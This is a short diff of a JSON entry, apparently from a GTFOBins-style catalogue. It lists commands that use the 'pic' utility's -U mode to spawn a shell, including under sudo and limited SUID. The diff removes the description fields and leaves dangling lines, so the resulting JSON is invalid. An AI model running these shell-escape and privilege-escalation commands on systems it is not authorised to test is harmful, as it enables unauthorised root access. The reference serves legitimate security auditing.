@@ -8,19 +8,19 @@
     ],
     "shell": [
       {
-        "description": "",
+        
         "code": "pic -U\n.PS\nsh X sh X\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo pic -U\n.PS\nsh X sh X\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./pic -U\n.PS\nsh X sh X\n"
       }
     ]
